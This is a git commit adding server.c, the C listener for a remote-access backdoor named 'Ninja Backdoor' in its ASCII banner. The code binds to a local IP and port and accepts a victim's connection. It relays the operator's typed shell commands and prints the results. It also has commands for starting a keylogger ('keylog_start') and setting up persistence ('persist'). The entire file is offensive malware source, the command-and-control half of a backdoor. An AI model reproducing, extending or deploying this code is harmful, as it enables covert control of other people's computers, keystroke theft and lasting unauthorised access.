54515f4f42a92b4edcba951bf5b876ff63ce8cf5
Viam Ahmadi <viamahmadi@gmail.com>
2021-03-28 15:45:23 +0430

    Project

---
+++ server.c
@@ -0,0 +1,76 @@
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+
+int main() {
+    char ip[16] = "192.168.1.106";
+    int port = 5005;
+    printf("%s", " _   _  _          _        \n"
+                 "| \\ | |(_) _ __   (_)  __ _ \n"
+                 "|  \\| || || '_ \\  | | / _` |\n"
+                 "| |\\  || || | | | | || (_| |\n"
+                 "|_| \\_||_||_| |_|_/ | \\__,_|\n"
+                 "                |__/        \n"
+                 " ____                _        _                     \n"
+                 "| __ )   __ _   ___ | | __ __| |  ___    ___   _ __ \n"
+                 "|  _ \\  / _` | / __|| |/ // _` | / _ \\  / _ \\ | '__|\n"
+                 "| |_) || (_| || (__ |   <| (_| || (_) || (_) || |   \n"
+                 "|____/  \\__,_| \\___||_|\\_\\\\__,_| \\___/  \\___/ |_|   \n"
+                 "   ");
+
+    int sock, client_socket;
+    char buffer[1024];
+    char response[18384];
+    struct sockaddr_in server_address, client_address;
+    int i = 0;
+    int optval = 1;
+    socklen_t client_length;
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
+        printf("Error Setting TCP Socket Options!\n");
+        return 1;
+    }
+
+    printf("\n\n* Ninja is listening on %s:%d\n", ip, port);
+
+    server_address.sin_family = AF_INET;
+    server_address.sin_addr.s_addr = inet_addr(ip);
+    server_address.sin_port = htons(port);
+
+    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
+    listen(sock, 5);
+    client_length = sizeof(client_address);
+    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
+
+    while (1) {
+        jump:
+        bzero(&buffer, sizeof(buffer));
+        bzero(&response, sizeof(response));
+        printf("* Ninja#%s~$: ", inet_ntoa(client_address.sin_addr));
+        fgets(buffer, sizeof(buffer), stdin);
+        strtok(buffer, "\n");
+        write(client_socket, buffer, sizeof(buffer));
+        if (strncmp("q", buffer, 1) == 0) {
+            break;
+        } else if (strncmp("cd ", buffer, 3) == 0) {
+            goto jump;
+        } else if (strncmp("keylog_start", buffer, 12) == 0) {
+            goto jump;
+        } else if (strncmp("persist", buffer, 7) == 0) {
+            recv(client_socket, response, sizeof(response), 0);
+            printf("%s", response);
+        } else {
+            recv(client_socket, response, sizeof(response), MSG_WAITALL);
+            printf("%s", response);
+        }
+
+    }
+
+}
